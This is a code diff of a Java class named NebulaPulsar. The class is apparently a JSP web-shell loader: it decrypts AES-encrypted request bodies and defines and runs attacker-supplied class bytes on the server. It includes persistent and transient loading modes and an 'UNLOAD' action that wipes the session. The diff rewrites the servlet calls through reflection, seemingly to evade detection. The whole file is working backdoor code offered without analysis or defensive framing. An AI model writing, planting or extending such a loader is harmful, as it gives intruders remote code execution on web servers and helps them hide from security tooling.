@@ -1,63 +1,79 @@
-import javax.servlet.jsp.PageContext;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import javax.servlet.http.HttpSession;
 import java.io.*;
 import java.lang.reflect.Method;
 
 public class NebulaPulsar extends ClassLoader
 {
-    private static final String KEY = "NBPULSARDEADBEEF";
+    private static String m_szKey = "NBPULSARDEADBEEF";
 
-    public NebulaPulsar(ClassLoader parent) { super(parent); }
+    public NebulaPulsar(ClassLoader objParent) { super(objParent); }
     public NebulaPulsar() { super(NebulaPulsar.class.getClassLoader()); }
 
-    public byte[] Crypt(byte[] abData, int nMode) throws Exception {
-        javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(KEY.getBytes("UTF-8"), "AES");
-        javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
-        cipher.init(nMode, skeySpec);
+    public byte[] Crypt(byte[] abData, int nMode) throws Exception
+    {
+        javax.crypto.spec.SecretKeySpec objSkeySpec = new javax.crypto.spec.SecretKeySpec(m_szKey.getBytes("UTF-8"), "AES");
+        javax.crypto.Cipher objCipher = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
+        objCipher.init(nMode, objSkeySpec);
 
-        return cipher.doFinal(abData);
+        return objCipher.doFinal(abData);
     }
 
-    private String GetParamValue(String paramStr, String key)
+    private String fnGetParamValue(String szParamStr, String szKeyName)
     {
-        if (paramStr == null || paramStr.isEmpty())
+        if (szParamStr == null || szParamStr.isEmpty())
             return "";
 
-        String[] pairs = paramStr.split("&");
-        for (String pair : pairs)
+        String[] aszPairs = szParamStr.split("&");
+        for (String szPair : aszPairs)
         {
-            int idx = pair.indexOf("=");
-            if (idx > 0 && pair.substring(0, idx).equals(key))
-                return pair.substring(idx + 1);
+            int nIdx = szPair.indexOf("=");
+            if (nIdx > 0 && szPair.substring(0, nIdx).equals(szKeyName))
+                return szPair.substring(nIdx + 1);
         }
+
         return "";
     }
 
     @Override
-    public boolean equals(Object obj) {
-        PageContext pageContext = (PageContext)obj;
-        HttpServletResponse response = (HttpServletResponse)pageContext.getResponse();
+    public boolean equals(Object objParam) {
+        Object objPageContext = objParam; 
+        Object objResponse = null;
+        Object objRequest = null;
 
         try
         {
-            HttpServletRequest request = (HttpServletRequest)pageContext.getRequest();
-            int nContentLength = request.getContentLength();
+            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
+            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);
+
+            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
+            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);
+
+            Method fnGetContentLength = objRequest.getClass().getMethod("getContentLength", new Class[0]);
+            int nContentLength = (Integer)fnGetContentLength.invoke(objRequest, new Object[0]);
 
             if (nContentLength == 0)
                 return true;
 
-            InputStream is = request.getInputStream();
+            Method fnGetInputStream = objRequest.getClass().getMethod("getInputStream", new Class[0]);
+            InputStream isClient = (InputStream)fnGetInputStream.invoke(objRequest, new Object[0]);
+
             byte[] abEncryptedData = new byte[nContentLength];
             int nReadLength = 0;
             while (nReadLength < nContentLength)
             {
-                int nRead = is.read(abEncryptedData, nReadLength, nContentLength - nReadLength);
+                int nRead = isClient.read(abEncryptedData, nReadLength, nContentLength - nReadLength);
                 if (nRead == -1)
                     break;
-
                 nReadLength += nRead;
+            }
+
+            Method fnGetSession = objPageContext.getClass().getMethod("getSession", new Class[0]);
+            Object objSession = fnGetSession.invoke(objPageContext, new Object[0]);
+            Method fnGetAttribute = objSession.getClass().getMethod("getAttribute", String.class);
+            Object objKey = fnGetAttribute.invoke(objSession, "k");
+            if (objKey != null)
+            {
+                String szKey = (String)objKey;
+                m_szKey = szKey;
             }
 
             byte[] abRawPayload = Crypt(abEncryptedData, 2);
@@ -67,71 +83,81 @@ public class NebulaPulsar extends ClassLoader
             int nParamLength = abRawPayload.length - nParamOffset;
             String szParam = new String(abRawPayload, nParamOffset, nParamLength, "UTF-8").trim();
             
-            String szAction = GetParamValue(szParam, "action");
+            String szAction = fnGetParamValue(szParam, "action");
             if (szAction.equalsIgnoreCase("UNLOAD"))
             {
-                HttpSession session = pageContext.getSession();
+                Method fnRemoveAttribute = objSession.getClass().getMethod("removeAttribute", new Class[]{String.class});
+                fnRemoveAttribute.invoke(objSession, new Object[]{"pulsar_loader"});
                 
-                session.removeAttribute("pulsar_loader");
+                Method fnInvalidate = objSession.getClass().getMethod("invalidate", new Class[0]);
+                fnInvalidate.invoke(objSession, new Object[0]);
                 
-                session.invalidate();
-                response.getWriter().print("PULSAR_DESTROY_SUCCESS: Memory cleared.");
+                Method fnGetWriter = objResponse.getClass().getMethod("getWriter", new Class[0]);
+                PrintWriter pwClient = (PrintWriter)fnGetWriter.invoke(objResponse, new Object[0]);
+                pwClient.print("PULSAR_DESTROY_SUCCESS: Memory cleared.");
+
                 return true; 
             }
 
             byte[] abClassBytes = new byte[nClassLength];
             System.arraycopy(abRawPayload, 4, abClassBytes, 0, nClassLength);
             
-            String szTargetMode = GetParamValue(szParam, "mode");
+            String szTargetMode = fnGetParamValue(szParam, "mode");
 
-            request.setAttribute("payload", abRawPayload);
-            request.setAttribute("len", String.valueOf(nClassLength));
+            Method fnSetAttribute = objRequest.getClass().getMethod("setAttribute", new Class[]{String.class, Object.class});
+            fnSetAttribute.invoke(objRequest, new Object[]{"payload", abRawPayload});
+            fnSetAttribute.invoke(objRequest, new Object[]{"len", String.valueOf(nClassLength)});
 
-            Class<?> clazz = null;
-            Object instance = null;
+            Class<?> clazzTarget = null;
+            Object objInstance = null;
 
             if (szTargetMode.equalsIgnoreCase("persistent"))
             {
                 try
                 {
-                    clazz = this.defineClass(abClassBytes, 0, abClassBytes.length);
+                    clazzTarget = this.defineClass(abClassBytes, 0, abClassBytes.length);
                 }
-                catch (LinkageError e)
+                catch (LinkageError errDuplicate)
                 {
-                    clazz = this.findLoadedClass("DarkMatter");
-                    if (clazz == null)
+                    clazzTarget = this.findLoadedClass("DarkMatter");
+                    if (clazzTarget == null)
                     {
-                        clazz = this.loadClass("DarkMatter");
+                        clazzTarget = this.loadClass("DarkMatter");
                     }
                 }
-                instance = clazz.newInstance();
+                objInstance = clazzTarget.newInstance();
             }
             else
             {
-                ClassLoader transientLoader = new java.net.URLClassLoader(new java.net.URL[0], this);
-                java.lang.reflect.Method defineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-                defineMethod.setAccessible(true);
-                clazz = (Class<?>) defineMethod.invoke(transientLoader, abClassBytes, 0, abClassBytes.length);
-                instance = clazz.newInstance();
-                transientLoader = null;
+                ClassLoader objTransientLoader = new java.net.URLClassLoader(new java.net.URL[0], this);
+                java.lang.reflect.Method fnDefineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                fnDefineMethod.setAccessible(true);
+                clazzTarget = (Class<?>)fnDefineMethod.invoke(objTransientLoader, abClassBytes, 0, abClassBytes.length);
+                objInstance = clazzTarget.newInstance();
+                objTransientLoader = null;
             }
 
-            Method method = clazz.getMethod("equals", Object.class);
-            method.invoke(instance, obj);
+            Method fnEqualsMethod = clazzTarget.getMethod("equals", Object.class);
+            fnSetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance", this});
+            fnEqualsMethod.invoke(objInstance, objParam);
             
-            clazz = null;
-            instance = null;
-
+            clazzTarget = null;
+            objInstance = null;
         }
-        catch (Throwable t)
+        catch (Throwable th)
         {
             try
             {
-                response.getWriter().print("CORE_INTERNAL_ERROR: " + t.toString());
+                if (objResponse != null)
+                {
+                    Method fnGetWriter = objResponse.getClass().getMethod("getWriter", new Class[0]);
+                    PrintWriter pwClient = (PrintWriter)fnGetWriter.invoke(objResponse, new Object[0]);
+                    pwClient.print("CORE_INTERNAL_ERROR: " + th.toString());
+                }
             } 
             catch (Exception ex)
             {
-
+                // do something
             }
         }
 
